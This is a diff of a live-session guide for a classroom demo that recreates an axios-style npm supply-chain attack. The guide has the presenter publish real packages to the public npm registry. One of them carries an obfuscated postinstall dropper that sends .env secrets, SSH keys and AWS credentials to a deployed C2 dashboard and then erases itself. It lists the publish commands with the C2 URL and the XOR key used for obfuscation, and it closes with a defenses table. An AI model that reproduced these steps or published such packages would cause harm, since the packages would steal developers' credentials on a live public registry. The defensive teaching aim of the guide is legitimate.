@@ -1,124 +1,63 @@
-# Realistic npm Supply Chain Attack — Live Session Guide (Axios-Style)
+# npm Supply Chain Attack — Live Session Guide
 
 ## Overview
 
 This demo replicates the **March 31, 2026 axios supply chain attack** on the real npm registry. Two packages are published under your npm scope:
 
-| Package | Role | Mirrors |
-|---------|------|---------|
-| `csec-form-validator` (default) or `@yourscope/csec-form-validator` | Legitimate-looking form validation library | `axios` (the trusted package) |
-| `csec-crypto-toolkit` or `@yourscope/csec-crypto-toolkit` | Hidden dependency with obfuscated postinstall dropper | `plain-crypto-js` (the malicious dependency) |
+| Package | Role | Real-World Mirror |
+|---------|------|-------------------|
+| `csec-form-validator` | Legitimate-looking form validation library | `axios` (the trusted package) |
+| `csec-crypto-toolkit` | Hidden dependency with obfuscated postinstall dropper | `plain-crypto-js` (the malicious dep) |
 
-**Scoped vs unscoped:** The repo defaults to **unscoped** names (`csec-form-validator`, `csec-crypto-toolkit`). Victims run:
+The victim installs `csec-form-validator`, which silently pulls `csec-crypto-toolkit`. The obfuscated `postinstall` hook exfiltrates `.env` secrets to the C2 server, then **erases itself** leaving no trace.
 
-```bash
-npm install csec-form-validator
-```
-
-Unscoped names are **global** on npm — if the name is already taken, publishing fails; use a unique name in `package.json` or switch to **scoped** packages (`@yourname/...` in `package.json`; `publish.sh` still patches `@yourname` to your logged-in user when present).
-
-The victim install pulls the hidden dependency, the obfuscated `postinstall` hook runs silently, exfiltrates `.env` secrets to your C2 server, then **erases itself** leaving no forensic trace.
+**C2 Dashboard (deployed):** [https://csec-supply-chain-attack.vercel.app/](https://csec-supply-chain-attack.vercel.app/)
 
 ---
 
 ## Prerequisites
 
 - **npm account** with publishing access (`npm login`)
-- **Node.js** on both attacker and victim machines
-- The C2 server from `demos/token-stealer/c2-server/`
+- **Node.js** on the victim machine (or your own machine for solo demo)
 
 ---
 
-## Before the Session (Setup)
+## Before the Session
 
-You have two options for the C2 server: deploy to **Render** (recommended — works from anywhere) or run **locally**.
-
----
-
-### Option A: Deploy C2 to Render (Recommended)
-
-This makes the C2 dashboard publicly accessible. The victim can be anywhere — no "same network" requirement.
-
-**Step 1: Deploy the C2 server to Render**
-
-The C2 service is already configured in `render.yaml`. Deploy it:
-
-```bash
-# Option 1: Push to GitHub and use Render Dashboard
-# Go to https://dashboard.render.com → New → Blueprint → select your repo
-# Render will auto-detect render.yaml and deploy csec-c2-server
-
-# Option 2: Deploy manually via Render CLI
-# render blueprint apply
-```
-
-After deploy, Render gives you a URL like `https://csec-supply-chain-attack-1tcq.onrender.com`.
-
-**Step 2: Login to npm**
+### Step 1 — Log in to npm
 
 ```bash
 npm login
 ```
 
-**Step 3: Publish with your Render URL**
+### Step 2 — Publish both packages
 
 ```bash
 cd demos/token-stealer/npm-publish
-./publish.sh https://csec-supply-chain-attack-1tcq.onrender.com
+./publish.sh https://csec-supply-chain-attack.vercel.app
 ```
 
-**Step 4: Open the C2 dashboard**
+This single command:
+1. Builds the obfuscated dropper (`setup.js`) with the C2 URL baked in
+2. Publishes `csec-crypto-toolkit` (the hidden dependency) to npm
+3. Publishes `csec-form-validator` (the main package) to npm
 
-Visit `https://csec-supply-chain-attack-1tcq.onrender.com` in your browser — the live dashboard is waiting for victims.
+### Step 3 — Verify
 
-**Step 5: Verify on npmjs.com**
+- Open [npmjs.com/package/csec-form-validator](https://www.npmjs.com/package/csec-form-validator) — looks like a normal form validation library
+- Open the [C2 Dashboard](https://csec-supply-chain-attack.vercel.app/) — log in and confirm it's ready
 
-Open `https://www.npmjs.com/package/csec-form-validator` — looks like a normal form validation package (use your actual package name if scoped).
+> **Note:** If using scoped packages (`@yourname/csec-form-validator`), the publish script auto-patches `@yourname` to your npm username.
 
 ---
 
-### Option B: Run C2 Locally (Same Network Required)
-
-Both machines must be on the same network (WiFi, LAN, VPN).
-
-**Step 1: Login to npm**
-
-```bash
-npm login
-```
-
-**Step 2: Publish both packages**
-
-```bash
-cd demos/token-stealer/npm-publish
-./publish.sh
-```
-
-The script auto-detects your local IP. To specify manually:
-
-```bash
-./publish.sh 192.168.1.50 4444
-```
-
-**Step 3: Start the C2 server**
-
-```bash
-cd demos/token-stealer/c2-server
-node server.js
-# Dashboard at http://localhost:4444
-```
-
-**Step 4: Verify on npmjs.com**
-
-Open `https://www.npmjs.com/package/csec-form-validator` in a browser. It looks like a completely normal form validation package. The dependency on `csec-crypto-toolkit` is listed but looks harmless.
-
----
-
-## During the Session
+## Presentation Script
 
 ### Act 1: The "Innocent" Install
 
-**On the victim machine (or have a participant do this):**
+**On the victim machine (or have a participant do this).**
+
+Narrate:
 
 > "I'm a developer starting a new project. I need form validation."
 
@@ -127,7 +66,7 @@ mkdir my-project && cd my-project
 npm init -y
 ```
 
-> "My project has secrets in a .env file — API keys, database credentials."
+> "My project has secrets in a .env file — API keys, database credentials. Standard stuff."
 
 ```bash
 cat > .env << 'EOF'
@@ -146,7 +85,7 @@ EOF
 npm install csec-form-validator
 ```
 
-**Point out:** The npm output looks completely normal. No warnings. No errors.
+**Pause.** Point out that npm output looks completely normal. No warnings. No errors.
 
 > "Let's use it — works great!"
 
@@ -158,16 +97,21 @@ console.log('Password:', validatePassword('Test@1234'));
 "
 ```
 
+---
+
 ### Act 2: The Reveal
 
-**Switch to the attacker machine's C2 dashboard** (`http://localhost:4444`)
+**Switch to the C2 dashboard:** [https://csec-supply-chain-attack.vercel.app/](https://csec-supply-chain-attack.vercel.app/)
 
-All the victim's secrets are displayed:
-- Every key-value pair from `.env`
-- Hostname, username, OS, IP, MAC address
-- Paths to sensitive files found (~/.ssh/id_rsa, ~/.npmrc, etc.)
+All the victim's secrets are now displayed:
+- Every key-value pair from `.env` (GitHub token, AWS keys, Stripe, database URL)
+- Hostname, username, OS, IP addresses, MAC address
+- Contents of sensitive files found (`~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.npmrc`)
+- Network interfaces
 
-> "The postinstall hook ran silently during npm install. Your secrets were gone before you typed your first line of code."
+> "The postinstall hook ran silently during `npm install`. Your secrets were gone before you typed your first line of code."
+
+---
 
 ### Act 3: The Forensic Investigation
 
@@ -176,81 +120,85 @@ All the victim's secrets are displayed:
 **On the victim machine:**
 
 ```bash
-# Check node_modules — the package works fine
+# The package works fine — nothing suspicious
 ls node_modules/csec-form-validator/
-# index.js, package.json — nothing suspicious
+# index.js, package.json — clean
 
 # Check the hidden dependency
 ls node_modules/csec-crypto-toolkit/
 # index.js, package.json — also looks clean!
-# No setup.js. No postinstall hook in package.json.
+# No setup.js. No postinstall in package.json.
 # The dropper ERASED ITSELF after running.
 
 # But the lockfile tells the truth
 cat package-lock.json | grep -A 5 "csec-crypto-toolkit"
-# Shows the dependency exists — it was pulled in automatically
+# Shows the dependency exists — pulled in automatically
 ```
 
-> "The attacker's code deleted itself after execution. If you inspect `node_modules` after the fact, you see nothing suspicious. This is exactly what the real axios attack did."
+> "The attacker's code deleted itself after execution. If you inspect node_modules after the fact, you see nothing suspicious. This is exactly what the real axios attack did."
 
-### Act 4: Reverse Engineering the Attack
+---
 
-> "Let's go back to the source and reverse-engineer the obfuscation."
+### Act 4: Reverse Engineering the Obfuscation
+
+> "Let's go back to the source and reverse-engineer the attack."
 
 **On the attacker machine:**
 
 ```bash
 cd demos/token-stealer/npm-publish
 
-# Look at the raw setup.js — it's a wall of obfuscated text
+# Look at the raw dropper — a wall of obfuscated text
 cat csec-crypto-utils/setup.js
 
-# Now deobfuscate it layer by layer
+# Deobfuscate it layer by layer
 node deobfuscate.js
 ```
 
-Walk through each step the deobfuscate script shows:
-1. **Examine**: A huge encoded string, a key, a constant, a decoder function
-2. **Reverse the string**: First layer undone
-3. **Restore Base64 padding**: `!` back to `=`
-4. **Base64 decode**: Binary data revealed
-5. **XOR decrypt**: With key `OrDeR_7077` and constant `333`
-6. **The plaintext payload**: Full .env scanner, system recon, C2 exfiltration, self-deletion
+Walk through each layer the script reveals:
+1. **Examine** — a huge encoded string, a key, a constant, a decoder function
+2. **Reverse the string** — first layer undone
+3. **Restore Base64 padding** — `!` back to `=`
+4. **Base64 decode** — binary data revealed
+5. **XOR decrypt** — with key `OrDeR_7077` and constant `333`
+6. **The plaintext payload** — full .env scanner, system recon, C2 exfiltration, self-deletion
 
 > "This is the exact same double-obfuscation technique the real axios attacker used. Reversed Base64 with padding substitution, XOR cipher. Two layers that defeat most static analysis tools."
+
+---
 
 ### Act 5: Defense Discussion
 
 > "How could this have been prevented?"
 
-1. **`npm install --ignore-scripts`** — blocks postinstall hooks entirely
-2. **Lockfiles + `npm ci`** — committed lockfile prevents pulling unexpected versions
-3. **Socket.dev / Snyk** — flags suspicious postinstall behavior (Socket detected the real attack in 6 minutes)
-4. **Audit before installing** — `npm info csec-form-validator` shows the dependency
-5. **Never store raw secrets in `.env`** — use vaults (AWS Secrets Manager, HashiCorp Vault)
-6. **MFA on npm accounts** — the real attack started with a hijacked maintainer account
-7. **Short-lived tokens / OIDC publishing** — no long-lived npm access tokens
+| Defense | What It Does |
+|---------|--------------|
+| `npm install --ignore-scripts` | Blocks postinstall hooks entirely |
+| Lockfiles + `npm ci` | Prevents pulling unexpected versions |
+| Socket.dev / Snyk | Flags suspicious postinstall behavior (Socket detected the real attack in 6 minutes) |
+| `npm info <pkg>` before installing | Shows hidden dependencies |
+| Secrets vaults (AWS Secrets Manager, HashiCorp Vault) | Never store raw secrets in `.env` |
+| MFA on npm accounts | The real attack started with a hijacked maintainer account |
+| Short-lived tokens / OIDC publishing | No long-lived npm access tokens to steal |
 
 ---
 
-## After the Session (Cleanup)
+## After the Session
 
-Remove both packages from npm immediately:
+Remove both packages from npm **immediately**:
 
 ```bash
 cd demos/token-stealer/npm-publish
 ./unpublish.sh
 ```
 
-This removes both packages listed in `csec-form-helpers/package.json` and `csec-crypto-utils/package.json` from the public registry (unscoped or scoped, depending on what you published).
-
-**Legacy packages** (e.g. you published `csec-form-helpers` or `@dany47/csec-form-helpers` earlier): those **stay on npm** until you remove them explicitly:
+For scoped packages published under a different name:
 
 ```bash
-./unpublish.sh @dany47/csec-form-helpers @dany47/csec-crypto-utils
+./unpublish.sh @yourscope/csec-form-validator @yourscope/csec-crypto-toolkit
 ```
 
-(Replace `dany47` with your scope.)
+> npm has a **72-hour unpublish window** for packages with no dependents. After that, contact npm support.
 
 ---
 
@@ -267,7 +215,7 @@ This removes both packages listed in `csec-form-helpers/package.json` and `csec-
 | `payload.js` | Plaintext payload source (not published) |
 | `build-obfuscated.js` | Encodes payload with reversed Base64 + XOR |
 | `deobfuscate.js` | Reverse engineering exercise — decodes setup.js layer by layer |
-| `publish.sh` | One-command publish to real npm |
+| `publish.sh` | One-command publish to real npm (pass C2 URL as argument) |
 | `unpublish.sh` | One-command cleanup after session |
 
 ---
@@ -282,7 +230,7 @@ This removes both packages listed in `csec-form-helpers/package.json` and `csec-
 | Reversed Base64 + XOR (key: `OrDeR_7077`, const: `333`) | Same obfuscation, same key, same constant |
 | Self-deletion + package.json swap | Self-deletion + package.md swap |
 | Cross-platform RAT (macOS/Win/Linux) | Recon + .env exfiltration (safe, no RAT) |
-| C2 at `sfrclak[.]com:8000` | C2 at your IP:4444 |
+| C2 at `sfrclak[.]com:8000` | C2 at [csec-supply-chain-attack.vercel.app](https://csec-supply-chain-attack.vercel.app/) |
 | Attributed to Sapphire Sleet (DPRK) | Educational demo |
 
 ---
@@ -291,12 +239,10 @@ This removes both packages listed in `csec-form-helpers/package.json` and `csec-
 
 | Problem | Fix |
 |---------|-----|
-| `npm ERR! 402` on publish | Scoped packages need `--access public` (already in publish.sh) |
-| `npm ERR! 403` — 2FA required | npm now requires **two-factor authentication** on your account, or a **granular access token** with publish permission. Go to [npmjs.com](https://www.npmjs.com) → Access Tokens → Generate New Token (Granular) → allow **Publish** for your scope, then `npm login` with that token, or enable 2FA and run `npm publish` again (enter OTP when prompted). |
-| `npm ERR! 403` (other) | Package name may be taken or you lack access. Change the name in package.json files |
-| Victim can't reach C2 (local) | Check firewall: `sudo ufw allow 4444`. Both must be on same network |
-| Victim can't reach C2 (Render) | Ensure the Render service is running (not spun down). Free tier spins down after inactivity — visit the dashboard URL to wake it |
-| Render service won't start | Check Render logs. The C2 server uses `PORT` env var which Render sets automatically |
-| Self-deletion didn't work | The `setup.js` `__dirname` may differ in some npm versions. Check `node_modules/csec-crypto-utils/` |
-| Unpublish fails | npm has a 72-hour unpublish window for packages with no dependents. After that, contact npm support |
-| HTTPS errors in payload | Make sure you passed the full URL with `https://` to publish.sh. The payload auto-selects http vs https |
+| `npm ERR! 402` on publish | Scoped packages need `--access public` (already handled by publish.sh) |
+| `npm ERR! 403` — 2FA required | npm requires 2FA or a granular access token with publish permission. Go to [npmjs.com](https://www.npmjs.com) -> Access Tokens -> Generate New Token (Granular) -> enable Publish |
+| `npm ERR! 403` (other) | Package name may be taken. Change the name in package.json files |
+| Secrets don't appear on C2 | Verify the victim has a `.env` file. Check that the correct C2 URL was passed to `publish.sh` |
+| Self-deletion didn't work | Check `node_modules/csec-crypto-utils/` — `__dirname` may differ in some npm versions |
+| Unpublish fails | npm has a 72-hour unpublish window. After that, contact npm support |
+| HTTPS errors in payload | Make sure you passed the full URL with `https://` to publish.sh |
